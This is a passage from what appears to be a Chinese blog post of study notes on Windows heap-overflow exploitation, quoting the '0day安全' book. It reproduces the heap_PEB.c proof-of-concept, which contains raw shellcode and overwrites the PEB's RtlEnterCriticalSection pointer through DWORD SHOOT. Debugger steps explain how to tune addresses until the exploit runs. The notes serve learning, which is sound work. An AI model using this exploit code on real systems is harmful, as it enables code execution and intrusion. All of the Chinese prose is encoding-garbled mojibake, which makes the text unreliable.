SHOOTå¯ä»¥æ›´æ”¹å†…å­˜ä¸­ä»»æ„åœ°å€çš„æ•°æ®ã€‚</p><p>(2) ä»£ç é€»è¾‘ï¼šä¿®æ”¹ä»£ç æ®µé‡è¦å‡½æ•°çš„å…³é”®é€»è¾‘æœ‰æ—¶å¯ä»¥è¾¾åˆ°ä¸€å®šæ”»å‡»æ•ˆæœã€‚ä¾‹å¦‚ï¼Œç¨‹åºåˆ†æ”¯å¤„çš„åˆ¤æ–­é€»è¾‘ï¼Œæˆ–è€…æŠŠèº«ä»½è®¤è¯å‡½æ•°çš„è°ƒç”¨æŒ‡ä»¤è¦†ç›–ä¸º0x90(nop)ã€‚è¿™ç§æ–¹æ³•æœ‰ç‚¹ç±»ä¼¼äºè½¯ä»¶ç ´è§£æŠ€æœ¯ä¸­çš„â€çˆ†ç ´â€œâ€”â€”é€šè¿‡æ›´æ”¹ä¸€ä¸ªå­—èŠ‚è€Œæ”¹å˜æ•´ä¸ªç¨‹åºçš„æµç¨‹ï¼Œç¬¬1ç« ä¸­çš„ç ´è§£å°è¯•éªŒå°±æ˜¯è¿™ç§åº”ç”¨çš„ä¾‹å­ã€‚</p><p>(3) å‡½æ•°è¿”å›åœ°å€ï¼šæ ˆæº¢å‡ºä¿®æ”¹å‡½æ•°è¿”å›åœ°å€èƒ½å¤ŸåŠ«æŒè¿›ç¨‹ï¼Œå †æº¢å‡ºä¹Ÿä¸€æ ·å¯ä»¥åˆ©ç”¨DWORD SHOOTæ›´æ”¹å‡½æ•°è¿”å›åœ°å€ã€‚ä½†ç”±äºæ ˆå¸§ç§»ä½çš„åŸå› ï¼Œå‡½æ•°è¿”å›åœ°å€å¾€å¾€æ˜¯ä¸å›ºå®šçš„ã€‚ç”šè‡³åœ¨åŒä¸€æ“ä½œç³»ç»Ÿå’Œè¡¥ä¸ç‰ˆæœ¬ä¸‹è¿ç»­è¿è¡Œä¸¤æ¬¡æ ˆçŠ¶æ€éƒ½ä¼šæœ‰ä¸åŒï¼Œæ•…DWORD SHOOTåœ¨è¿™ç§æƒ…å†µä¸‹æœ‰ä¸€å®šå±€é™æ€§ï¼Œå› ä¸ºç§»åŠ¨çš„é¶å­ä¸å¥½ç„å‡†ã€‚</p><p>(4) æ”»å‡»å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼šå½“ç¨‹åºäº§ç”Ÿå¼‚å¸¸æ—¶ï¼ŒWindowsä¼šè½¬å…¥å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚å †æº¢å‡ºå¾ˆå®¹æ˜“å¼•èµ·å¼‚å¸¸ï¼Œå› æ­¤å¼‚å¸¸å¤„ç†æœºåˆ¶æ‰€ä½¿ç”¨çš„é‡è¦æ•°æ®ç»“æ„å¾€å¾€ä¼šæˆä¸ºDWORD SHOOTçš„ä¸Šç­‰ç›®æ ‡ï¼Œè¿™åŒ…æ‹¬S.E.Hï¼ˆstructure exception handlerï¼‰ã€F.V.E.Hï¼ˆFirst Vectored Exception Handlerï¼‰ã€è¿›ç¨‹ç¯å¢ƒå—ï¼ˆP.E.Bï¼‰ä¸­çš„U.E.Fï¼ˆUnhandled Exception Filterï¼‰ã€çº¿ç¨‹ç¯å¢ƒå—ï¼ˆT.E.Bï¼‰ä¸­å­˜æ”¾çš„ç¬¬ä¸€ä¸ªS.E.HæŒ‡é’ˆï¼ˆT.E.Hï¼‰ã€‚</p><p>(5) å‡½æ•°æŒ‡é’ˆï¼šç³»ç»Ÿæœ‰æ—¶ä¼šä½¿ç”¨ä¸€äº›å‡½æ•°æŒ‡é’ˆï¼Œæ¯”å¦‚è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ã€C++ä¸­çš„è™šå‡½æ•°è°ƒç”¨ç­‰ã€‚æ”¹å†™è¿™äº›å‡½æ•°æŒ‡é’ˆåï¼Œåœ¨å‡½æ•°è°ƒç”¨å‘ç”Ÿåå¾€å¾€å¯ä»¥æˆåŠŸåŠ«æŒè¿›ç¨‹ã€‚ä½†å¯æƒœçš„æ˜¯ï¼Œä¸æ˜¯æ¯ä¸€ä¸ªæ¼æ´éƒ½å¯ä»¥ä½¿ç”¨è¿™é¡¹æŠ€æœ¯ï¼Œè¿™å–å†³äºè½¯ä»¶çš„å¼€å‘æ–¹å¼ã€‚</p><p>(6) P.E.Bä¸­çº¿ç¨‹åŒæ­¥å‡½æ•°çš„å…¥å£åœ°å€ï¼šå¤©æ‰çš„é»‘å®¢ä»¬å‘ç°åœ¨æ¯ä¸ªè¿›ç¨‹çš„P.E.Bä¸­éƒ½å­˜æ”¾ç€ä¸€å¯¹åŒæ­¥å‡½æ•°æŒ‡é’ˆï¼ŒæŒ‡å‘RtlEnterCriticalSection()å’ŒRtlLeaveCriticalSection()ï¼Œå¹¶ä¸”åœ¨è¿›ç¨‹é€€å‡ºæ—¶ä¼šè¢«ExitProcess()è°ƒç”¨ã€‚å¦‚æœèƒ½å¤Ÿé€šè¿‡DWORD SHOOTä¿®æ”¹è¿™å¯¹æŒ‡é’ˆä¸­çš„å…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆåœ¨ç¨‹åºé€€å‡ºæ—¶ExitProcess()å°†ä¼šè¢«éª—å»è°ƒç”¨æˆ‘ä»¬çš„shellcodeã€‚ç”±äºP.E.Bçš„ä½ç½®å§‹ç»ˆä¸ä¼šå˜åŒ–ï¼Œè¿™å¯¹æŒ‡é’ˆåœ¨P.E.Bä¸­çš„åç§»ä¹Ÿå§‹ç»ˆä¸å˜ï¼Œè¿™ä½¿å¾—åˆ©ç”¨å †æº¢å‡ºå¼€å‘å‡ºé€‚ç”¨äºä¸åŒæ“ä½œç³»ç»Ÿç‰ˆæœ¬å’Œè¡¥ä¸ç‰ˆæœ¬çš„exploitæˆä¸ºå¯èƒ½ã€‚è¿™ç§æ–¹æ³•ä¸€ç»æå‡ºå°±ç«‹åˆ»æˆä¸ºWindowså¹³å°ä¸‹å †æº¢å‡ºå“­ä¸€è¾¹ç»™çš„æ˜¯æœ€ç»å…¸æ–¹æ³•ä¹‹ä¸€ï¼Œå› ä¸ºé™æ­¢çš„é¶å­æ¯”æ´»åŠ¨çš„é¶å­å¥½æ‰“å¾—å¤šï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæªæ¶å¥½ï¼Œé—­ç€çœ¼ç›æ‰£æ‰³æœºå°±æ˜¯äº†ã€‚</p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P169-170</cite></footer></blockquote><h4 id="1-åˆ©ç”¨P-E-Bï¼ˆè¿›ç¨‹ç¯å¢ƒå—ï¼‰å®æ–½æ”»å‡»"><a href="#1-åˆ©ç”¨P-E-Bï¼ˆè¿›ç¨‹ç¯å¢ƒå—ï¼‰å®æ–½æ”»å‡»" class="headerlink" title="(1) åˆ©ç”¨P.E.Bï¼ˆè¿›ç¨‹ç¯å¢ƒå—ï¼‰å®æ–½æ”»å‡»"></a>(1) åˆ©ç”¨P.E.Bï¼ˆè¿›ç¨‹ç¯å¢ƒå—ï¼‰å®æ–½æ”»å‡»</h4><h5 id="1-P-E-Båˆ©ç”¨åŸç†"><a href="#1-P-E-Båˆ©ç”¨åŸç†" class="headerlink" title="1) P.E.Båˆ©ç”¨åŸç†"></a>1) P.E.Båˆ©ç”¨åŸç†</h5><blockquote><p>Windowsä¸ºäº†åŒæ­¥è¿›ç¨‹ä¸‹çš„å¤šä¸ªçº¿ç¨‹ï¼Œä½¿ç”¨äº†ä¸€äº›åŒæ­¥æªæ–½ï¼Œå¦‚é”æœºåˆ¶ï¼ˆlockï¼‰ã€ä¿¡å·é‡ï¼ˆsemaphoreï¼‰ã€ä¸´ç•ŒåŒºï¼ˆcritical sectionï¼‰ç­‰ã€‚è®¸å¤šæ“ä½œéƒ½è¦ç”¨åˆ°è¿™äº›åŒæ­¥æœºåˆ¶ã€‚</p><p>å½“è¿›ç¨‹é€€å‡ºæ—¶ï¼ŒExitProcess()å‡½æ•°è¦åšå¾ˆå¤šå–„åå·¥ä½œï¼Œå…¶ä¸­å¿…ç„¶éœ€è¦ç”¨åˆ°ä¸´ç•ŒåŒºå‡½æ•°RtlEnterCriticalSection()å’ŒRtlLeaveCriticalSection()æ¥åŒæ­¥çº¿ç¨‹é˜²æ­¢â€œè„æ•°æ®â€çš„äº§ç”Ÿã€‚</p><p>ä¸çŸ¥ä»€ä¹ˆåŸå› ï¼Œå¾®è½¯çš„å·¥ç¨‹å¸ˆä¼¼ä¹å †ExitProcess()æƒ…æœ‰ç‹¬é’Ÿï¼Œå› ä¸ºå®ƒè°ƒç”¨ä¸´ç•ŒåŒºçš„æ–¹æ³•æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯é€šè¿‡è¿›ç¨‹ç¯å¢ƒå—P.E.Bä¸­åç§»0x20å¤„å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆæ¥é—´æ¥å®Œæˆçš„ã€‚å…·ä½“è¯´æ¥å°±æ˜¯åœ¨0x7FFDF020å¤„å­˜æ”¾ç€æŒ‡å‘RtlEnterCriticalSection()çš„æŒ‡é’ˆï¼Œåœ¨0x7FFDF024å¤„å­˜æ”¾ç€æŒ‡å‘RtlLeaveCriticalSection()çš„æŒ‡é’ˆã€‚</p><p><em><strong>é¢˜å¤–è¯ï¼šä»Windows 2003 Serverå¼€å§‹ï¼Œå¾®è½¯å·²ç»ä¿®æ”¹äº†è¿™é‡Œçš„å®ç°ã€‚</strong></em></p><footer><strong>ç‹æ¸…</strong><cite>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P170</cite></footer></blockquote><h5 id="2-å®éªŒ"><a href="#2-å®éªŒ" class="headerlink" title="2) å®éªŒ"></a>2) å®éªŒ</h5><p>æœ¬å®éªŒé€šè¿‡æ·¹æ²¡å°¾å—å—é¦–ï¼Œæ¥è§¦å‘DWORD SHOOTä»¥ä¿®æ”¹P.E.Bä¸­0x20å¤„å­˜æ”¾çš„æŒ‡å‘RtlEnterCriticalSection()å‡½æ•°çš„æŒ‡é’ˆï¼Œå¯¼è‡´ç¨‹åºéœ€è¦è°ƒç”¨å®ƒæ—¶å®é™…å´æ‰§è¡Œäº†shellcodeã€‚</p><p>å®éªŒä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><figcaption><span>ã€Š0dayå®‰å…¨ï¼šè½¯ä»¶æ¼æ´åˆ†ææŠ€æœ¯ã€‹(ç¬¬äºŒç‰ˆ) -> P171 -> heap_PEB.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC code of chapter 6.4 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name: heap_PEB.c</span></span><br><span class="line"><span class="comment">author: failwest  </span></span><br><span class="line"><span class="comment">date: 2007.04.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">description: demo show of heap overrun, shellcode was executed</span></span><br><span class="line"><span class="comment">  function pointer of RtlEnterCriticalSection was changed in PEB</span></span><br><span class="line"><span class="comment">  via DWORD shooting</span></span><br><span class="line"><span class="comment">  Some address may need to reset via run time debugging</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Noticed:1 only run on windows 2000</span></span><br><span class="line"><span class="comment">2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">3 build into release version</span></span><br><span class="line"><span class="comment">4 used for run time debugging</span></span><br><span class="line"><span class="comment">version: 1.0</span></span><br><span class="line"><span class="comment">E-mail: failwest@gmail.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";//200 bytes 0x90</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">char shellcode[]=</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="comment">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="comment">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="comment">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="comment">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="comment">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="comment">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="comment">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="comment">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="comment">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="comment">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">"\x16\x01\x1A\x00\x00\x10\x00\x00"// head of the ajacent free block</span></span><br><span class="line"><span class="comment">"\x88\x06\x52\x00\x20\xf0\xfd\x7f";</span></span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="comment">//repaire the pointer which shooted by heap over run</span></span><br><span class="line"><span class="string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="comment">//MOV EAX,7FFDF020</span></span><br><span class="line"><span class="string">"\xBB\x4C\xAA\xF8\x77"</span>  <span class="comment">//MOV EBX,77F8AA4C the address here may releated to your OS</span></span><br><span class="line"><span class="string">"\x89\x18"</span><span class="comment">//MOV DWORD PTR DS:[EAX],EBX</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">"\x88\x06\x52\x00\x20\xf0\xfd\x7f"</span>;</span><br><span class="line"><span class="comment">//0x00520688 is the address of shellcode in first heap block, you have to make sure this address via debug </span></span><br><span class="line"><span class="comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span></span><br><span class="line"><span class="comment">//and will be called by ExitProcess() at last</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line"><span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ç¯å¢ƒå¦‚ä¸‹ï¼š</p><ul><li>æ“ä½œç³»ç»Ÿï¼šè¿è¡ŒäºVmwareè™šæ‹Ÿæœºï¼Œç‰ˆæœ¬Win 2K SP4 5.00.2195 EN</li><li>ç¼–è¯‘å™¨ï¼šVisual C++ 6.0</li><li>ç¼–è¯‘é€‰é¡¹ï¼šé»˜è®¤é€‰é¡¹</li><li>buildç‰ˆæœ¬ï¼šreleaseç‰ˆ</li></ul><p>ä»£ç ä¸­ç¬¬3ä¸ªä¸ºæœ€ç»ˆç‰ˆæœ¬çš„shellcodeï¼Œè¿™ä¸ªshellcodeæ•ˆæœæ˜¯æ‰§è¡ŒMessageBoxA()å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œä½†æ®0dayä¹¦ä¸­è§£é‡Šï¼Œshellcodeä¸­è°ƒç”¨çš„å‡½æ•°ä¹Ÿéœ€è¦ä½¿ç”¨ä¸´ç•ŒåŒºï¼Œå› æ­¤åœ¨å…¶æ‰§è¡Œè¿‡ç¨‹ä¸­ä¹Ÿéœ€è¦è°ƒç”¨P.E.Bä¸­0x20åç§»å¤„çš„æŒ‡é’ˆæŒ‡å‘çš„RtlEnterCriticalSection()å‡½æ•°ï¼Œä½†è¯¥å¤„çš„å‡½æ•°æŒ‡é’ˆåœ¨shellcodeæ‰§è¡Œæ—¶å·²ç»è¢«æˆ‘ä»¬æ‰åŒ…ï¼Œå› æ­¤ä¼šå¯¼è‡´shellcodeä¸­çš„å‡½æ•°æ‰§è¡Œä¸æˆåŠŸã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦åœ¨shellcodeè°ƒç”¨å…³é”®å‡½æ•°å‰ä¿®å¤è¯¥å¤„çš„å€¼ï¼Œshellcodeä¸­77-79è¡Œçš„ä»£ç å°±æ˜¯è¿›è¡Œä¿®å¤å·¥ä½œçš„ã€‚</p><p>é¦–å…ˆï¼Œå»æ‰ä»£ç 104è¡Œå¤„çš„æ³¨é‡Šï¼Œé€šè¿‡INT 3ä¸­æ–­è¿›å…¥OllyDBGè¿›è¡Œè°ƒè¯•ã€‚</p><p>ç”±äºRtlEnterCriticalSection()å‡½æ•°çš„å®é™…åœ°å€åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸Šæœ‰æ‰€å·®å¼‚ï¼Œå› æ­¤æ­¤å¤„éœ€è¦æ‰‹åŠ¨ç¡®å®šï¼Œç”±äºP.E.Bçš„åœ°å€æ˜¯å›ºå®šçš„ï¼Œä¸º0x7FFDF000ï¼Œå› æ­¤åœ¨å†…å­˜æŸ¥çœ‹çª—å£ä¸­é€šè¿‡Ctrl+Gå¹¶é”®å…¥0x7FFDF020æ¥åˆ°å…¶åç§»0x20å¤„è§‚å¯Ÿï¼Œå¾—åˆ°åœ¨æˆ‘çš„ç³»ç»Ÿä¸­RtlEnterCriticalSection()å‡½æ•°çš„åœ°å€ä¸º0x77F82060ï¼Œå› æ­¤å°†shellcodeä¸­78è¡Œå¤„çš„ä¿®å¤ä»£ç ä¸­çš„è¯¥å‡½æ•°åœ°å€è¿›è¡Œä¿®æ”¹ï¼Œæœ¬è¡Œæ•´ä½“æ”¹ä¸ºâ€\xBB\x60\x20\xF8\x77â€ï¼Œå…¶ä¸­\xBBä¸ºMOV EBXçš„æœºå™¨ç ã€‚</p><p>æ¥ç€ï¼Œè§‚å¯Ÿshellcodeä¸­ç¬¬92è¡Œï¼Œ0dayä¹¦ä¸­å°¾å—çš„åœ°å€ä¸º0x00520688ï¼Œè€Œæˆ‘çš„æœºå™¨ä¸Šä¸º0x00360688ï¼Œå› æ­¤å°†å…¶ä¸­çš„\x52ä¿®æ”¹ä¸º\x36å³å¯ã€‚</p><p>æœ€åï¼Œå†å°†ç¬¬104è¡Œçš„INT 3ä¸­æ–­æ³¨é‡Šæ‰ï¼Œé‡æ–°ç¼–è¯‘è¿è¡Œç¨‹åºï¼Œå³å¯æˆåŠŸå¼¹çª—ã€‚è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœä¸æ³¨é‡Šæ‰è¯¥è¡Œä»£ç ï¼ŒINT 3ä¸­æ–­åè¿›å…¥OllyDBGè¿›è¡Œè°ƒè¯•ï¼Œæœ€ç»ˆç¨‹åºä¼šç»ˆæ­¢åœ¨ntdllçš„å†…æ ¸ä»£ç ä¸­ï¼Œä¸ä¼šæˆåŠŸå¼¹çª—ï¼Œä¹Ÿä¸ä¼šæ‰§è¡Œåˆ°æˆ‘ä»¬çš„shellcodeï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šä¿®æ”¹é€‰é¡¹æˆ–è€…ä¸åŒæ–­ç‚¹çš„æ–¹å¼éƒ½æ— æ³•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œç”±äºå®ƒä¸å½±å“æˆ‘ä»¬å¯¹åˆ©ç”¨P.E.Bè¿›è¡Œå †æº¢å‡ºåˆ©ç”¨çš„ç†è§£ï¼Œå› æ­¤æ”¾åœ¨åé¢è®¨è®ºã€‚</p><h5 id="3-å…³äºå…¶ä¸­ç»†èŠ‚çš„æ€è€ƒ"><a href="#3-å…³äºå…¶ä¸­ç»†èŠ‚çš„æ€è€ƒ" class="headerlink" title="3) å…³äºå…¶ä¸­ç»†èŠ‚çš„æ€è€ƒ"></a>3) å…³äºå…¶ä¸­ç»†èŠ‚çš„æ€è€ƒ</h5><p>è™½ç„¶æ— æ³•è·Ÿè¸ªè°ƒè¯•å †æº¢å‡ºçš„è¿‡ç¨‹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä¸€ä¸‹å †æº¢å‡ºä¹‹å‰çš„å †å†…å­˜çš„åˆ†å¸ƒï¼Œå½“ä»£ç æ‰§è¡Œåˆ°106è¡Œmemcpy()è°ƒç”¨ä¹‹å‰æ—¶ï¼Œè§‚å¯Ÿç©ºè¡¨ç´¢å¼•åŒºï¼Œå¦‚ä¸‹å›¾ï¼š</p><img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_1.png" class="" title="å›¾2.2.1.1"><p>è§‚å¯Ÿå †æ•°æ®åŒºï¼š</p><img data-src="/tech/heap-overflow-learning-notes-2/2_2_1_2.png" class="" title="å›¾2.2.1.2"><p>å¯ä»¥çœ‹åˆ°å°¾å—çš„å‰åå‘æŒ‡é’ˆå‡æŒ‡å‘0x178å¤„çš„Freelist[0]ã€‚</p><p>æ¥ç€æ‰§è¡Œä»£ç 